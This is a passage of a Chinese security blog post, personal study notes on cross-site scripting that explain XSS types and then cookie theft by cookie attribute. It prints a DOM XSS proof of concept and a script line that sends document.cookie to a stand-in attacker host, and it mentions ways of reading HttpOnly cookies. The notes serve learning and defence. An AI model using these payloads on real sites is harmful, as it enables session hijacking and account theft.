<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>前端Hack之XSS攻击个人学习笔记 | Yunen's Blog</title><meta name="description" content="XSS个人学习笔记"><meta name="keywords" content="XSS,web安全"><meta name="author" content="Yunen"><meta name="copyright" content="Yunen"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://hm.baidu.com"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="前端Hack之XSS攻击个人学习笔记"><meta name="twitter:description" content="XSS个人学习笔记"><meta name="twitter:image" content="https://p.pstatp.com/origin/fec8000053163f2df2fb"><meta property="og:type" content="article"><meta property="og:title" content="前端Hack之XSS攻击个人学习笔记"><meta property="og:url" content="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><meta property="og:site_name" content="Yunen's Blog"><meta property="og:description" content="XSS个人学习笔记"><meta property="og:image" content="https://p.pstatp.com/origin/fec8000053163f2df2fb"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      now = new Date();
      hour = now.getHours();
      isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><link rel="prev" title="使用Django简单编写一个XSS平台" href="https://www.0x002.com/2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"><link rel="next" title="PHP反序列化漏洞的简单学习" href="https://www.0x002.com/2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,cookieDomain:"https://www.0x002.com/",msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简"},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},bookmark:{title:"Snackbar.bookmark.title",message_prev:"按",message_next:"键将本页加入书签"},runtime_unit:"天",runtime:!0,copyright:{languages:{author:"作者: Yunen",link:"链接: undefined",source:"来源: Yunen's Blog",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},ClickShowText:void 0,medium_zoom:!1,fancybox:!0,Snackbar:void 0,baiduPush:!1,highlightCopy:!0,highlightLang:!0,highlightShrink:!1,isFontAwesomeV5:!1}</script><script>var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1}</script><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://p.pstatp.com/origin/ff850000903c9c0b30d2" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">20</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">25</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">3</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fa fa-rss"></i> <span>RSS</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i> <span>其他</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i> <span>书籍</span></a></li><li><a class="site-page" href="/project/"><i class="fa-fw fa fa-file-text"></i> <span>项目</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单概述"><span class="toc-text">简单概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-什么是XSS"><span class="toc-text">1) 什么是XSS?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-XSS可以带来哪些危害？"><span class="toc-text">2) XSS可以带来哪些危害？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-XSS类型"><span class="toc-text">3) XSS类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型XSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-XSS的利用方式"><span class="toc-text">4) XSS的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie窃取"><span class="toc-text">Cookie窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#默认"><span class="toc-text">默认</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不同域"><span class="toc-text">不同域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不同路径"><span class="toc-text">不同路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Http-Only"><span class="toc-text">Http Only</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secure"><span class="toc-text">Secure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#P3P"><span class="toc-text">P3P</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#B域设置A域Cookie"><span class="toc-text">B域设置A域Cookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#加载B域时Cookie传入问题"><span class="toc-text">加载B域时Cookie传入问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#会话劫持"><span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#钓鱼"><span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS重定向钓鱼"><span class="toc-text">XSS重定向钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML注入式钓鱼"><span class="toc-text">HTML注入式钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Iframe"><span class="toc-text">Iframe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-XSS漏洞的挖掘"><span class="toc-text">5) XSS漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白盒审计"><span class="toc-text">白盒审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑盒审计"><span class="toc-text">黑盒审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#手工检测"><span class="toc-text">手工检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#工具检测"><span class="toc-text">工具检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-shellcode的绕过"><span class="toc-text">6) shellcode的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过XSS-Filter"><span class="toc-text">绕过XSS-Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#空格回车和Tab"><span class="toc-text">空格回车和Tab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对标签属性值进行转码"><span class="toc-text">对标签属性值进行转码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzz标签未过滤事件名"><span class="toc-text">Fuzz标签未过滤事件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Css绕过"><span class="toc-text">使用Css绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扰乱规则"><span class="toc-text">扰乱规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用字符编码"><span class="toc-text">利用字符编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#拆分法"><span class="toc-text">拆分法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-XSS防御"><span class="toc-text">7) XSS防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#输入"><span class="toc-text">输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输出"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#写在最后"><span class="toc-text">写在最后</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附录"><span class="toc-text">附录</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image:url(https://p.pstatp.com/origin/fec8000053163f2df2fb)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Yunen's Blog</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fa fa-rss"></i> <span>RSS</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i> <span>其他</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i> <span>书籍</span></a></li><li><a class="site-page" href="/project/"><i class="fa-fw fa fa-file-text"></i> <span>项目</span></a></li></ul></div></div></span></div><div id="post-info"><div id="post-title"><div class="posttitle">前端Hack之XSS攻击个人学习笔记</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-03-09<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-06-17</time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/">原创栏目</a></span></div><div class="meta-secondline"><span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i> <span>字数总计:</span><span class="word-count">6.9k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 25 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"></i> <span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h1 id="简单概述"><a href="#简单概述" class="headerlink" title="简单概述"></a>简单概述</h1><p><strong><br>&#160; &#160; &#160; &#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)</strong><br><a id="more"></a></p><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1) 什么是XSS?"></a>1) 什么是XSS?</h2><p><strong><br>&#160; &#160; &#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。</strong><br>&#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考<a href="https://baike.baidu.com/item/xss/917356" target="_blank" rel="noopener">百度百科</a><br>&#160; &#160; &#160; &#160;在<strong>余弦大大</strong>和<strong>xisigr大大</strong>的书籍《Web前端安全技术揭秘》第三章中这样说道：</p><blockquote><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。</p></blockquote><p>&#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。</p><h2 id="2-XSS可以带来哪些危害？"><a href="#2-XSS可以带来哪些危害？" class="headerlink" title="2) XSS可以带来哪些危害？"></a>2) XSS可以带来哪些危害？</h2><p>&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：</p><ul><li>网页挂马;</li><li>盗取Cookie;</li><li>DoS攻击;</li><li>钓鱼攻击;</li><li>蠕虫攻击;</li><li>劫持用户web行为;</li><li>结合CSRF进行针对性攻击;</li><li>······</li></ul><p>这些都是可以利用XSS漏洞来达成的。</p><h2 id="3-XSS类型"><a href="#3-XSS类型" class="headerlink" title="3) XSS类型"></a>3) XSS类型</h2><p>目前的XSS总共可以分为三种类型：</p><ul><li><strong>反射型(也叫非持久型)</strong></li><li><strong>存储型(也叫持久型)</strong></li><li><strong>DOM型</strong></li></ul><p>PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong><br>&#160; &#160; &#160; &#160;反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)</strong><br>&#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。<br>&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a>。</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》</strong><br>&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识<br>&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在<a href="https://baike.baidu.com/item/DOM/50288" target="_blank" rel="noopener">百度百科</a>得到相应的解答。</strong><br>&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。<br>&#160; &#160; &#160; &#160;在<strong>刺</strong>的《白帽子讲Web安全》是这样讲的：</p><blockquote><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。</p></blockquote><p>&#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;document.URL;</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;a&#x3D;&quot;)+2,a.length));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问<code>http://127.0.0.1/1.html#a=test</code><br>&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。<br><img src="/img/loading.gif" alt="访问结果" class="lazyload" data-src="https://i.loli.net/2019/03/09/5c839d5c04d33.png"><br>&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问<br><code>http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。<br>&#160; &#160; &#160; &#160;具体执行过程如图：<img src="/img/loading.gif" alt="来自《黑客攻防技术宝典Web实战篇》" class="lazyload" data-src="https://i.loli.net/2019/03/09/5c83cca814d51.jpg"><p></p><h2 id="4-XSS的利用方式"><a href="#4-XSS的利用方式" class="headerlink" title="4) XSS的利用方式"></a>4) XSS的利用方式</h2><p>&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。</p><h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><p><strong>&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>会弹出当前页面的cookie信息。</strong></p><hr><p>&#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念：</p><blockquote><p>首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面<code>http://www.a.com/index.html</code>，域名是 <code>www.a.com</code>，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：<img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/10/5c84907479e30.jpg"><br>&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。<br>&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：<br>&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB<br>&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM<br>&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）</p></blockquote><p>&#160; &#160; &#160; &#160;————引自<strong>晚风</strong>表哥在信安之路上的投稿文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487543&amp;idx=1&amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">《同源策略与跨域请求》</a></p><hr><p>&#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性：</p><ul><li>Domain————设置关联Cookie的域名;</li><li>Expires————通过给定一个过期时间来创建一个持久化Cookie;</li><li>Httponly————用于避免Cookie被Javascript访问;</li><li>Name————Cookie的名称;</li><li>Path————关联到Cookie的路径，默认为/;</li><li>Value————读写Cookie的值;</li><li>Secure————用于指定Cookie需要通过安全Socket层传递连接;</li></ul><p>&#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为：</p><ul><li>本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;</li><li>内存Cookie————即储存在内存中，随浏览器的关闭而消失;</li></ul><p>&#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。<br>&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况</p><h4 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h4><p>&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p></p><h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为<strong>本域</strong>。<br>&#160; &#160; &#160; &#160;例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的Cookie，可是如果<code>www.a.com</code>的Cookie值中的domain属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的xss漏洞获取到<code>www.a.com</code>的Cookie值。</p><h4 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h4><p>&#160; &#160; &#160; &#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置cookie值且不知道path，那么path默认为<code>/admin/</code>。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有<code>/admin/</code>目录下的javascipt才能读取前边设置的Cookie。</p><h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h4><p>&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。</p><ul><li>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</li><li>利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。</li></ul><p>感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)</p><h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。</p><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。<br>&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。</p><h5 id="B域设置A域Cookie"><a href="#B域设置A域Cookie" class="headerlink" title="B域设置A域Cookie"></a>B域设置A域Cookie</h5><p>&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。</p><h5 id="加载B域时Cookie传入问题"><a href="#加载B域时Cookie传入问题" class="headerlink" title="加载B域时Cookie传入问题"></a>加载B域时Cookie传入问题</h5><p>&#160; &#160; &#160; 